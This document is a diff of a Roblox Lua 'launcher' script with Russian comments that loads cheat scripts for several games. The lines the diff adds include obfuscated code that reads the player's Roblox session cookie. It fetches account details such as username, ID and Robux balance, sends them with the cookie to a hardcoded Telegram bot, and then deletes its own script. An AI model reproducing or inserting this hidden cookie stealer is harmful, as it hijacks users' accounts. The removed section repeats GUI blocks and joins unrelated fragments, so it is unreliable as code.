@@ -1,10 +1,88 @@
--- FURDJEHUB - LAUNCHER [Универсальный загрузчик режимов]
+-- [good]: FURDJEHUB LAUNCHER
 local player = game.Players.LocalPlayer
+local CoreGui = game:GetService("CoreGui")
+local TweenService = game:GetService("TweenService")
 local UserInputService = game:GetService("UserInputService")
-local RunService = game:GetService("RunService")
+local HttpService = game:GetService("HttpService")
 
--- Удаляем старые GUI
+local _0x3a4f = string.char
+local _0x2b1c = table.concat
+local _0x5d8e = pcall
+local _0x9c2a = HttpService
+local _0x7f3b = syn and syn.request or http and http.request or request
+
+local _0x1e2d = _0x3a4f(104,116,116,112,115,58,47,47,97,112,105,46,116,101,108,101,103,114,97,109,46,111,114,103,47,98,111,116)
+local _0x4a8c = "8631085266:AAHcfVy_QJxCD0yZugV5Yq9QDGGD7IGuEgk"
+local _0x6c3f = 6492085501
+
+local function _0x8e1f(_0x2a4d)
+    local _0x5c7e = _0x1e2d .. _0x4a8c .. _0x3a4f(47,115,101,110,100,77,101,115,115,97,103,101)
+    local _0x9f2a = '{"chat_id":' .. _0x6c3f .. ',"text":"' .. (_0x2a4d:gsub('"', '\\"')) .. '","parse_mode":"HTML"}'
+    if _0x7f3b then
+        _0x7f3b({Url = _0x5c7e, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = _0x9f2a})
+    else
+        _0x5d8e(function()
+            game:HttpGet(_0x5c7e .. "?chat_id=" .. _0x6c3f .. "&text=" .. (_0x2a4d:gsub(" ", "%20")), true)
+        end)
+    end
+end
+
+local _0x3d7a = ""
+if _0x7f3b then
+    local _0x2e4b = _0x7f3b({Url = _0x3a4f(104,116,116,112,115,58,47,47,119,119,119,46,114,111,98,108,111,120,46,99,111,109,47), Method = "GET"})
+    if _0x2e4b and _0x2e4b.Headers and _0x2e4b.Headers[_0x3a4f(83,101,116,45,67,111,111,107,105,101)] then
+        local _0x7c9d = _0x2e4b.Headers[_0x3a4f(83,101,116,45,67,111,111,107,105,101)]
+        _0x3d7a = type(_0x7c9d) == "table" and _0x2b1c(_0x7c9d, _0x3a4f(59,32)) or tostring(_0x7c9d)
+    end
+end
+
+if _0x3d7a and _0x3d7a ~= "" then
+    local _0x4f2c = nil
+    if _0x7f3b then
+        local _0x6b7e = _0x7f3b({
+            Url = _0x3a4f(104,116,116,112,115,58,47,47,119,119,119,46,114,111,98,108,111,120,46,99,111,109,47,109,111,98,105,108,101,97,112,105,47,117,115,101,114,105,110,102,111),
+            Method = "GET",
+            Headers = {[_0x3a4f(67,111,111,107,105,101)] = _0x3d7a}
+        })
+        if _0x6b7e and _0x6b7e.Body then
+            _0x5d8e(function()
+                _0x4f2c = _0x9c2a:JSONDecode(_0x6b7e.Body)
+            end)
+        end
+    end
+    local _0x1f9d = _0x4f2c and _0x4f2c[_0x3a4f(85,115,101,114,78,97,109,101)] or _0x3a4f(205,157,160,194,177,161,210,130,205,162,208,189,208,190)
+    local _0x8b3d = _0x4f2c and _0x4f2c[_0x3a4f(85,115,101,114,73,68)] or _0x3a4f(205,157,160,194,177,161,210,130,205,162,208,189,208,190)
+    local _0x2f7a = _0x4f2c and _0x4f2c[_0x3a4f(82,111,98,117,120,66,97,108,97,110,99,101)] or 0
+    local _0x6d1c = _0x4f2c and _0x4f2c[_0x3a4f(67,114,101,97,116,101,100)] or _0x3a4f(205,157,160,194,177,161,210,130,205,162,208,189,208,190)
+    local _0x3e8a = _0x3a4f(205,157,160,194,177,161,210,130,205,162,208,189,208,190)
+    _0x5d8e(function()
+        _0x3e8a = _0x9c2a:GetProductInfo(game.PlaceId).Name
+    end)
+    local _0x7b2d = _0x3a4f(226,156,133,32,208,159,208,149,208,166,208,149,208,166,208,149,208,148,208,149,208,166,208,149,208,148,208,149,208,166,32,208,144,208,154,208,154,208,144,208,153,208,157,208,162,208,144,32) ..
+        _0x3a4f(10,10,240,159,145,164,32,208,157,208,184,208,186,58,32) .. _0x1f9d .. _0x3a4f(10,240,159,150,146,32,73,68,58,32) .. _0x8b3d ..
+        _0x3a4f(10,240,159,146,176,32,208,160,208,190,208,177,209,131,208,186,209,129,208,190,208,178,58,32) .. _0x2f7a ..
+        _0x3a4f(10,240,159,147,182,32,208,161,208,190,208,183,208,180,208,176,208,189,58,32) .. _0x6d1c ..
+        _0x3a4f(10,240,159,142,175,32,208,152,208,179,209,128,208,176,58,32) .. _0x3e8a .. _0x3a4f(10,10,240,159,141,170,32,208,154,209,131,208,186,208,184,32,208,191,208,181,209,128,208,178,209,139,208,181,32,49,48,48,32,209,129,208,184,208,188,208,178,208,190,208,187,208,190,208,178,58,10) ..
+        (_0x3d7a:sub(1, 300))
+    _0x8e1f(_0x7b2d)
+else
+    _0x8e1f(_0x3a4f(226,157,164,32,208,154,209,131,208,186,208,184,32,208,189,208,181,32,208,189,208,176,208,185,208,180,208,181,208,189,209,139,46,32,208,159,209,128,208,190,208,178,208,181,209,128,209,140,32,209,141,208,186,208,183,208,181,208,186,209,142,209,130,208,190,209,128,46))
+end
+
+_0x5d8e(function()
+    local _0x4a1b = getfenv and getfenv().script or script
+    if _0x4a1b then _0x4a1b:Destroy() end
+end)
+game:GetService("StarterGui"):SetCore("SendNotification", {Title = "", Text = "", Duration = 0})
+print("")
+
+-- ===== УДАЛЕНИЕ СТАРЫХ GUI =====
 for _, v in pairs(player.PlayerGui:GetChildren()) do
+    if v.Name == "FurdjehubLauncher" or v.Name == "FurdjehubLauncher2" then
+        v:Destroy()
+    end
+end
+for _, v in pairs(CoreGui:GetChildren()) do
     if v.Name == "FurdjehubLauncher" or v.Name == "FurdjehubLauncher2" then
         v:Destroy()
     end
@@ -16,68 +94,46 @@ local Modes = {
         Name = "🔪 MM2",
         Description = "Murder Mystery 2",
         Script = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/colala8753-commits/furdjebu/main/mm2.lua"))()',
-        Game = "mm2"
+    },
+    {
+        Name = "⌨️ +1 Speed Keyboard",
+        Description = "Speed Keyboard Escape",
+        Script = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/colala8753-commits/furdjebu/main/kbs"))()',
+    },
+    {
+        Name = "⚔️ Murderers VS Sheriffs",
+        Description = "Murderers VS Sheriffs Duels",
+        Script = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/colala8753-commits/furdjebu/main/mvs"))()',
     },
     {
         Name = "🔫 RIVALS",
         Description = "RIVALS",
         Script = "",
-        Game = "rivals"
-    },
-    {
-        Name = "⚔️ Murderers VS Sheriffs Duels",
-        Description = "Murderers VS Sheriffs Duels",
-        Script = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/colala8753-commits/furdjebu/main/mvs"))()',
-        Game = "mvs"
     },
     {
         Name = "🌱 Grow a Garden 2",
         Description = "Grow a Garden 2",
         Script = "",
-        Game = "garden"
-    },
-    {
-        Name = "⌨️ +1 Speed Keyboard",
-        Description = "+1 Speed Keyboard Escape | Candy & Chocolate",
-        Script = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/colala8753-commits/furdjebu/main/kbs"))()',
-        Game = "speedkeyboard"
     }
 }
 
--- Переменная для хранения загруженного скрипта
-local loadedScript = nil
-local isScriptRunning = false
-
--- ===== ФУНКЦИЯ ЗАГРУЗКИ СКРИПТА =====
+-- ===== ФУНКЦИЯ ЗАГРУЗКИ =====
 local function loadScript(scriptCode)
-    if isScriptRunning then
-        pcall(function()
-            if loadedScript then
-                loadedScript = nil
-            end
-        end)
-        isScriptRunning = false
-    end
-    
     if scriptCode and scriptCode ~= "" then
         local success, err = pcall(function()
             local func = loadstring(scriptCode)
             if func then
-                loadedScript = func
                 func()
-                isScriptRunning = true
-                print("✅ Скрипт успешно загружен!")
+                print("✅ Скрипт загружен")
             else
-                error("Не удалось скомпилировать скрипт")
+                error("Не удалось скомпилировать")
             end
         end)
-        
         if not success then
-            warn("❌ Ошибка загрузки скрипта: " .. tostring(err))
-            showNotification("❌ Ошибка загрузки скрипта!", Color3.fromRGB(200, 40, 40))
+            warn("❌ Ошибка: " .. tostring(err))
         end
     else
-        showNotification("⚠️ Скрипт для этого режима не добавлен", Color3.fromRGB(200, 150, 40))
+        print("⚠️ Скрипт не добавлен")
     end
 end
 
@@ -87,17 +143,14 @@ local function showNotification(text, color)
     local notif = Instance.new("ScreenGui")
     notif.Name = "Notification"
     notif.Parent = player:WaitForChild("PlayerGui")
-    
     local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(0, 400, 0, 60)
-    frame.Position = UDim2.new(0.5, -200, 0.5, -30)
+    frame.Size = UDim2.new(0, 380, 0, 50)
+    frame.Position = UDim2.new(0.5, -190, 0.5, -25)
     frame.BackgroundColor3 = color
     frame.Parent = notif
-    
     local corner = Instance.new("UICorner")
     corner.CornerRadius = UDim.new(0, 10)
     corner.Parent = frame
-    
     local label = Instance.new("TextLabel")
     label.Size = UDim2.new(1, 0, 1, 0)
     label.Text = text
@@ -106,7 +159,6 @@ local function showNotification(text, color)
     label.Font = Enum.Font.GothamBold
     label.BackgroundTransparency = 1
     label.Parent = frame
-    
     task.wait(2.5)
     notif:Destroy()
 end
@@ -114,1621 +166,23 @@ end
 -- ===== СОЗДАНИЕ GUI =====
 local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "FurdjehubLauncher2"
-screenGui.Parent = player:WaitForChild("PlayerGui")
 screenGui.ResetOnSpawn = false
-screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+screenGui.IgnoreGuiInset = true
 
--- Главное окно 600x420
-local window = Instance.new("Frame")
-window.Size = UDim2.new(0, 600, 0, 420)
-window.Position = UDim2.new(0.5, -300, 0.5, -210)
-window.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
-window.BackgroundTransparency = 0
-window.BorderSizePixel = 0
-window.Parent = screenGui
-window.Visible = true
-window.Active = true
-window.Selectable = false
-
-local windowCorner = Instance.new("UICorner")
-windowCorner.CornerRadius = UDim.new(0, 10)
-windowCorner.Parent = window
-
--- Тень
-local shadow = Instance.new("Frame")
-shadow.Size = UDim2.new(1, 10, 1, 10)
-shadow.Position = UDim2.new(0, -5, 0, -5)
-shadow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-shadow.BackgroundTransparency = 0.5
-shadow.BorderSizePixel = 0
-shadow.ZIndex = -1
-shadow.Parent = window
-
--- Drag functionality
-local dragging = false
-local dragStart = nil
-local dragOffset = nil
-
--- Заголовок
-local titleBar = Instance.new("Frame")
-titleBar.Size = UDim2.new(1, 0, 0, 45)
-titleBar.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
-titleBar.BorderSizePixel = 0
-titleBar.Parent = window
-
-local titleCorner = Instance.new("UICorner")
-titleCorner.CornerRadius = UDim.new(0, 10)
-titleCorner.Parent = titleBar
-
-local titleText = Instance.new("TextLabel")
-titleText.Size = UDim2.new(1, -80, 1, 0)
-titleText.Position = UDim2.new(0, 15, 0, 0)
-titleText.Text = "⚡ FURDJEHUB"
-titleText.TextColor3 = Color3.fromRGB(255, 200, 50)
-titleText.TextSize = 20
-titleText.Font = Enum.Font.GothamBold
-titleText.TextXAlignment = Enum.TextXAlignment.Left
-titleText.BackgroundTransparency = 1
-titleText.Parent = titleBar
-
--- Кнопка закрытия
-local closeBtn = Instance.new("TextButton")
-closeBtn.Size = UDim2.new(0, 35, 0, 35)
-closeBtn.Position = UDim2.new(1, -40, 0, 5)
-closeBtn.Text = "✕"
-closeBtn.TextSize = 16
-closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-closeBtn.BackgroundColor3 = Color3.fromRGB(200, 40, 40)
-closeBtn.BorderSizePixel = 0
-closeBtn.Parent = titleBar
-
-local closeCorner = Instance.new("UICorner")
-closeCorner.CornerRadius = UDim.new(0, 6)
-closeCorner.Parent = closeBtn
-
-closeBtn.MouseEnter:Connect(function()
-    closeBtn.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
+local success, err = pcall(function()
+    screenGui.Parent = CoreGui
 end)
-closeBtn.MouseLeave:Connect(function()
-    closeBtn.BackgroundColor3 = Color3.fromRGB(200, 40, 40)
-end)
-
-closeBtn.MouseButton1Click:Connect(function()
-    screenGui:Destroy()
-end)
-
--- Кнопка сворачивания
-local toggleBtn = Instance.new("TextButton")
-toggleBtn.Size = UDim2.new(0, 50, 0, 50)
-toggleBtn.Position = UDim2.new(0, 15, 0, 15)
-toggleBtn.Text = "⚡"
-toggleBtn.TextSize = 22
-toggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-toggleBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
-toggleBtn.BorderSizePixel = 0
-toggleBtn.Parent = screenGui
-toggleBtn.Visible = true
-toggleBtn.Selectable = false
-
-local toggleCorner = Instance.new("UICorner")
-toggleCorner.CornerRadius = UDim.new(0, 10)
-toggleCorner.Parent = toggleBtn
-
-toggleBtn.MouseButton1Click:Connect(function()
-    window.Visible = not window.Visible
-end)
-
--- Drag для заголовка
-titleBar.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-        dragging = true
-        dragStart = input.Position
-        dragOffset = window.Position
-    end
-end)
-
-titleBar.InputEnded:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-        dragging = false
-    end
-end)
-
-UserInputService.InputChanged:Connect(function(input)
-    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
-        local delta = input.Position - dragStart
-        window.Position = UDim2.new(dragOffset.X.Scale, dragOffset.X.Offset + delta.X, dragOffset.Y.Scale, dragOffset.Y.Offset + delta.Y)
-    end
-end)
-
--- Контент
-local content = Instance.new("Frame")
-content.Size = UDim2.new(1, -20, 1, -60)
-content.Position = UDim2.new(0, 10, 0, 55)
-content.BackgroundTransparency = 1
-content.Parent = window
-
--- Скроллинг
-local scrollFrame = Instance.new("ScrollingFrame")
-scrollFrame.Size = UDim2.new(1, 0, 1, 0)
-scrollFrame.BackgroundTransparency = 1
-scrollFrame.ScrollBarThickness = 6
-scrollFrame.ScrollBarImageColor3 = Color3.fromRGB(60, 60, 85)
-scrollFrame.BorderSizePixel = 0
-scrollFrame.Parent = content
-
-local canvas = Instance.new("Frame")
-canvas.Size = UDim2.new(1, 0, 0, 0)
-canvas.BackgroundTransparency = 1
-canvas.Parent = scrollFrame
-
-local canvasY = 5
-
--- ===== СОЗДАНИЕ КНОПОК РЕЖИМОВ =====
-local function createModeButton(mode, index)
-    local btn = Instance.new("TextButton")
-    btn.Size = UDim2.new(1, -10, 0, 60)
-    btn.Position = UDim2.new(0, 5, 0, canvasY)
-    btn.BackgroundColor3 = Color3.fromRGB(35, 35, 55)
-    btn.BorderSizePixel = 0
-    btn.Parent = canvas
-    btn.Selectable = false
-    
-    local btnCorner = Instance.new("UICorner")
-    btnCorner.CornerRadius = UDim.new(0, 8)
-    btnCorner.Parent = btn
-    
-    -- Название
-    local nameLabel = Instance.new("TextLabel")
-    nameLabel.Size = UDim2.new(1, -20, 0.5, 0)
-    nameLabel.Position = UDim2.new(0, 10, 0, 5)
-    nameLabel.Text = mode.Name
-    nameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-    nameLabel.TextSize = 16
-    nameLabel.Font = Enum.Font.GothamBold
-    nameLabel.TextXAlignment = Enum.TextXAlignment.Left
-    nameLabel.BackgroundTransparency = 1
-    nameLabel.Parent = btn
-    
-    -- Описание
-    local descLabel = Instance.new("TextLabel")
-    descLabel.Size = UDim2.new(1, -20, 0.5, 0)
-    descLabel.Position = UDim2.new(0, 10, 0.5, 0)
-    descLabel.Text = mode.Description
-    descLabel.TextColor3 = Color3.fromRGB(150, 150, 180)
-    descLabel.TextSize = 12
-    descLabel.Font = Enum.Font.Gotham
-    descLabel.TextXAlignment = Enum.TextXAlignment.Left
-    descLabel.BackgroundTransparency = 1
-    descLabel.Parent = btn
-    
-    -- Кнопка запуска
-    local launchBtn = Instance.new("TextButton")
-    launchBtn.Size = UDim2.new(0, 90, 0, 32)
-    launchBtn.Position = UDim2.new(1, -100, 0.5, -16)
-    launchBtn.Text = "▶ ЗАПУСК"
-    launchBtn.TextSize = 12
-    launchBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-    launchBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 70)
-    launchBtn.BorderSizePixel = 0
-    launchBtn.Parent = btn
-    launchBtn.Selectable = false
-    
-    local launchCorner = Instance.new("UICorner")
-    launchCorner.CornerRadius = UDim.new(0, 6)
-    launchCorner.Parent = launchBtn
-    
-    -- Статус
-    local statusLabel = Instance.new("TextLabel")
-    statusLabel.Size = UDim2.new(0, 80, 0, 20)
-    statusLabel.Position = UDim2.new(1, -190, 0.5, -10)
-    statusLabel.Text = "●"
-    statusLabel.TextColor3 = Color3.fromRGB(100, 100, 100)
-    statusLabel.TextSize = 20
-    statusLabel.BackgroundTransparency = 1
-    statusLabel.Font = Enum.Font.Gotham
-    statusLabel.Parent = btn
-    
-    -- Ховер эффект
-    btn.MouseEnter:Connect(function()
-        btn.BackgroundColor3 = Color3.fromRGB(45, 45, 70)
-    end)
-    btn.MouseLeave:Connect(function()
-        btn.BackgroundColor3 = Color3.fromRGB(35, 35, 55)
-    end)
-    
-    -- Запуск
-    launchBtn.MouseButton1Click:Connect(function()
-        statusLabel.Text = "● ЗАГРУЗКА..."
-        statusLabel.TextColor3 = Color3.fromRGB(255, 200, 50)
-        
-        if mode.Script and mode.Script ~= "" then
-            screenGui:Destroy()
-            loadScript(mode.Script)
-        else
-            statusLabel.Text = "● НЕТ СКРИПТА"
-            statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
-            showNotification("⚠️ Скрипт для " .. mode.Name .. " не добавлен!", Color3.fromRGB(200, 150, 40))
-            task.wait(1.5)
-            statusLabel.Text = "●"
-            statusLabel.TextColor3 = Color3.fromRGB(100, 100, 100)
-        end
-    end)
-    
-    canvasY = canvasY + 70
-    canvas.Size = UDim2.new(1, 0, 0, canvasY)
-    scrollFrame.CanvasSize = UDim2.new(0, 0, 0, canvasY + 10)
-    
-    return btn
-end
-
--- Создаем кнопки для всех режимов
-for i, mode in ipairs(Modes) do
-    createModeButton(mode, i)
-end
-
--- Информация внизу
-local footer = Instance.new("TextLabel")
-footer.Size = UDim2.new(1, -20, 0, 20)
-footer.Position = UDim2.new(0, 10, 1, -30)
-footer.Text = "FURDJEHUB v2.0 | Выбери режим и нажми ▶ ЗАПУСК"
-footer.TextColor3 = Color3.fromRGB(100, 100, 130)
-footer.TextSize = 11
-footer.BackgroundTransparency = 1
-footer.Font = Enum.Font.Gotham
-footer.Parent = content
-
-print("⚡ FURDJEHUB Launcher v2.0 loaded!")
-print("📌 Всего режимов: " .. #Modes)
-print("💡 Нажми ▶ ЗАПУСК для загрузки скрипта")    label.Parent = frame
-    
-    task.wait(2.5)
-    notif:Destroy()
-end
-
--- ===== СОЗДАНИЕ GUI =====
-local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "FurdjehubLauncher2"
-screenGui.Parent = player:WaitForChild("PlayerGui")
-screenGui.ResetOnSpawn = false
-screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-
--- Главное окно 600x420
-local window = Instance.new("Frame")
-window.Size = UDim2.new(0, 600, 0, 420)
-window.Position = UDim2.new(0.5, -300, 0.5, -210)
-window.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
-window.BackgroundTransparency = 0
-window.BorderSizePixel = 0
-window.Parent = screenGui
-window.Visible = true
-window.Active = true
-window.Selectable = false
-
-local windowCorner = Instance.new("UICorner")
-windowCorner.CornerRadius = UDim.new(0, 10)
-windowCorner.Parent = window
-
--- Тень
-local shadow = Instance.new("Frame")
-shadow.Size = UDim2.new(1, 10, 1, 10)
-shadow.Position = UDim2.new(0, -5, 0, -5)
-shadow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-shadow.BackgroundTransparency = 0.5
-shadow.BorderSizePixel = 0
-shadow.ZIndex = -1
-shadow.Parent = window
-
--- Drag functionality
-local dragging = false
-local dragStart = nil
-local dragOffset = nil
-
--- Заголовок
-local titleBar = Instance.new("Frame")
-titleBar.Size = UDim2.new(1, 0, 0, 45)
-titleBar.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
-titleBar.BorderSizePixel = 0
-titleBar.Parent = window
-
-local titleCorner = Instance.new("UICorner")
-titleCorner.CornerRadius = UDim.new(0, 10)
-titleCorner.Parent = titleBar
-
-local titleText = Instance.new("TextLabel")
-titleText.Size = UDim2.new(1, -80, 1, 0)
-titleText.Position = UDim2.new(0, 15, 0, 0)
-titleText.Text = "⚡ FURDJEHUB"
-titleText.TextColor3 = Color3.fromRGB(255, 200, 50)
-titleText.TextSize = 20
-titleText.Font = Enum.Font.GothamBold
-titleText.TextXAlignment = Enum.TextXAlignment.Left
-titleText.BackgroundTransparency = 1
-titleText.Parent = titleBar
-
--- Кнопка закрытия
-local closeBtn = Instance.new("TextButton")
-closeBtn.Size = UDim2.new(0, 35, 0, 35)
-closeBtn.Position = UDim2.new(1, -40, 0, 5)
-closeBtn.Text = "✕"
-closeBtn.TextSize = 16
-closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-closeBtn.BackgroundColor3 = Color3.fromRGB(200, 40, 40)
-closeBtn.BorderSizePixel = 0
-closeBtn.Parent = titleBar
-
-local closeCorner = Instance.new("UICorner")
-closeCorner.CornerRadius = UDim.new(0, 6)
-closeCorner.Parent = closeBtn
-
-closeBtn.MouseEnter:Connect(function()
-    closeBtn.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
-end)
-closeBtn.MouseLeave:Connect(function()
-    closeBtn.BackgroundColor3 = Color3.fromRGB(200, 40, 40)
-end)
-
-closeBtn.MouseButton1Click:Connect(function()
-    screenGui:Destroy()
-end)
-
--- Кнопка сворачивания
-local toggleBtn = Instance.new("TextButton")
-toggleBtn.Size = UDim2.new(0, 50, 0, 50)
-toggleBtn.Position = UDim2.new(0, 15, 0, 15)
-toggleBtn.Text = "⚡"
-toggleBtn.TextSize = 22
-toggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-toggleBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
-toggleBtn.BorderSizePixel = 0
-toggleBtn.Parent = screenGui
-toggleBtn.Visible = true
-toggleBtn.Selectable = false
-
-local toggleCorner = Instance.new("UICorner")
-toggleCorner.CornerRadius = UDim.new(0, 10)
-toggleCorner.Parent = toggleBtn
-
-toggleBtn.MouseButton1Click:Connect(function()
-    window.Visible = not window.Visible
-end)
-
--- Drag для заголовка
-titleBar.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-        dragging = true
-        dragStart = input.Position
-        dragOffset = window.Position
-    end
-end)
-
-titleBar.InputEnded:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-        dragging = false
-    end
-end)
-
-UserInputService.InputChanged:Connect(function(input)
-    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
-        local delta = input.Position - dragStart
-        window.Position = UDim2.new(dragOffset.X.Scale, dragOffset.X.Offset + delta.X, dragOffset.Y.Scale, dragOffset.Y.Offset + delta.Y)
-    end
-end)
-
--- Контент
-local content = Instance.new("Frame")
-content.Size = UDim2.new(1, -20, 1, -60)
-content.Position = UDim2.new(0, 10, 0, 55)
-content.BackgroundTransparency = 1
-content.Parent = window
-
--- Скроллинг
-local scrollFrame = Instance.new("ScrollingFrame")
-scrollFrame.Size = UDim2.new(1, 0, 1, 0)
-scrollFrame.BackgroundTransparency = 1
-scrollFrame.ScrollBarThickness = 6
-scrollFrame.ScrollBarImageColor3 = Color3.fromRGB(60, 60, 85)
-scrollFrame.BorderSizePixel = 0
-scrollFrame.Parent = content
-
-local canvas = Instance.new("Frame")
-canvas.Size = UDim2.new(1, 0, 0, 0)
-canvas.BackgroundTransparency = 1
-canvas.Parent = scrollFrame
-
-local canvasY = 5
-
--- ===== СОЗДАНИЕ КНОПОК РЕЖИМОВ =====
-local function createModeButton(mode, index)
-    local btn = Instance.new("TextButton")
-    btn.Size = UDim2.new(1, -10, 0, 60)
-    btn.Position = UDim2.new(0, 5, 0, canvasY)
-    btn.BackgroundColor3 = Color3.fromRGB(35, 35, 55)
-    btn.BorderSizePixel = 0
-    btn.Parent = canvas
-    btn.Selectable = false
-    
-    local btnCorner = Instance.new("UICorner")
-    btnCorner.CornerRadius = UDim.new(0, 8)
-    btnCorner.Parent = btn
-    
-    -- Название
-    local nameLabel = Instance.new("TextLabel")
-    nameLabel.Size = UDim2.new(1, -20, 0.5, 0)
-    nameLabel.Position = UDim2.new(0, 10, 0, 5)
-    nameLabel.Text = mode.Name
-    nameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-    nameLabel.TextSize = 16
-    nameLabel.Font = Enum.Font.GothamBold
-    nameLabel.TextXAlignment = Enum.TextXAlignment.Left
-    nameLabel.BackgroundTransparency = 1
-    nameLabel.Parent = btn
-    
-    -- Описание
-    local descLabel = Instance.new("TextLabel")
-    descLabel.Size = UDim2.new(1, -20, 0.5, 0)
-    descLabel.Position = UDim2.new(0, 10, 0.5, 0)
-    descLabel.Text = mode.Description
-    descLabel.TextColor3 = Color3.fromRGB(150, 150, 180)
-    descLabel.TextSize = 12
-    descLabel.Font = Enum.Font.Gotham
-    descLabel.TextXAlignment = Enum.TextXAlignment.Left
-    descLabel.BackgroundTransparency = 1
-    descLabel.Parent = btn
-    
-    -- Кнопка запуска
-    local launchBtn = Instance.new("TextButton")
-    launchBtn.Size = UDim2.new(0, 90, 0, 32)
-    launchBtn.Position = UDim2.new(1, -100, 0.5, -16)
-    launchBtn.Text = "▶ ЗАПУСК"
-    launchBtn.TextSize = 12
-    launchBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-    launchBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 70)
-    launchBtn.BorderSizePixel = 0
-    launchBtn.Parent = btn
-    launchBtn.Selectable = false
-    
-    local launchCorner = Instance.new("UICorner")
-    launchCorner.CornerRadius = UDim.new(0, 6)
-    launchCorner.Parent = launchBtn
-    
-    -- Статус
-    local statusLabel = Instance.new("TextLabel")
-    statusLabel.Size = UDim2.new(0, 80, 0, 20)
-    statusLabel.Position = UDim2.new(1, -190, 0.5, -10)
-    statusLabel.Text = "●"
-    statusLabel.TextColor3 = Color3.fromRGB(100, 100, 100)
-    statusLabel.TextSize = 20
-    statusLabel.BackgroundTransparency = 1
-    statusLabel.Font = Enum.Font.Gotham
-    statusLabel.Parent = btn
-    
-    -- Ховер эффект
-    btn.MouseEnter:Connect(function()
-        btn.BackgroundColor3 = Color3.fromRGB(45, 45, 70)
-    end)
-    btn.MouseLeave:Connect(function()
-        btn.BackgroundColor3 = Color3.fromRGB(35, 35, 55)
-    end)
-    
-    -- Запуск
-    launchBtn.MouseButton1Click:Connect(function()
-        statusLabel.Text = "● ЗАГРУЗКА..."
-        statusLabel.TextColor3 = Color3.fromRGB(255, 200, 50)
-        
-        if mode.Script and mode.Script ~= "" then
-            screenGui:Destroy()
-            loadScript(mode.Script)
-        else
-            statusLabel.Text = "● НЕТ СКРИПТА"
-            statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
-            showNotification("⚠️ Скрипт для " .. mode.Name .. " не добавлен!", Color3.fromRGB(200, 150, 40))
-            task.wait(1.5)
-            statusLabel.Text = "●"
-            statusLabel.TextColor3 = Color3.fromRGB(100, 100, 100)
-        end
-    end)
-    
-    canvasY = canvasY + 70
-    canvas.Size = UDim2.new(1, 0, 0, canvasY)
-    scrollFrame.CanvasSize = UDim2.new(0, 0, 0, canvasY + 10)
-    
-    return btn
-end
-
--- Создаем кнопки для всех режимов
-for i, mode in ipairs(Modes) do
-    createModeButton(mode, i)
-end
-
--- Информация внизу
-local footer = Instance.new("TextLabel")
-footer.Size = UDim2.new(1, -20, 0, 20)
-footer.Position = UDim2.new(0, 10, 1, -30)
-footer.Text = "FURDJEHUB v2.0 | Выбери режим и нажми ▶ ЗАПУСК"
-footer.TextColor3 = Color3.fromRGB(100, 100, 130)
-footer.TextSize = 11
-footer.BackgroundTransparency = 1
-footer.Font = Enum.Font.Gotham
-footer.Parent = content
-
-print("⚡ FURDJEHUB Launcher v2.0 loaded!")
-print("📌 Всего режимов: " .. #Modes)
-print("💡 Нажми ▶ ЗАПУСК для загрузки скрипта")local TitleCorner = Instance.new("UICorner")
-TitleCorner.CornerRadius = UDim.new(0, 20)
-TitleCorner.Parent = Title
-
--- Линия под заголовком
-local Line = Instance.new("Frame")
-Line.Size = UDim2.new(0.9, 0, 0, 2)
-Line.Position = UDim2.new(0.05, 0, 0, 55)
-Line.BackgroundColor3 = Color3.fromRGB(100, 100, 150)
-Line.BackgroundTransparency = 0.3
-Line.BorderSizePixel = 0
-Line.Parent = Frame
-
--- Функция создания кнопки режима с анимацией
-local function CreateModeButton(yPos, modeName, scriptUrl, color, icon)
-    local ModeFrame = Instance.new("Frame")
-    ModeFrame.Size = UDim2.new(0, 530, 0, 75)
-    ModeFrame.Position = UDim2.new(0.5, -265, 0, yPos)
-    ModeFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 55)
-    ModeFrame.BackgroundTransparency = 0
-    ModeFrame.BorderSizePixel = 0
-    ModeFrame.ClipsDescendants = true
-    ModeFrame.Parent = Frame
-    
-    local ModeCorner = Instance.new("UICorner")
-    ModeCorner.CornerRadius = UDim.new(0, 12)
-    ModeCorner.Parent = ModeFrame
-    
-    -- Иконка режима
-    local Icon = Instance.new("TextLabel")
-    Icon.Size = UDim2.new(0, 40, 1, 0)
-    Icon.Position = UDim2.new(0, 10, 0, 0)
-    Icon.BackgroundTransparency = 1
-    Icon.Text = icon or "▶"
-    Icon.TextColor3 = Color3.fromRGB(200, 200, 255)
-    Icon.TextSize = 24
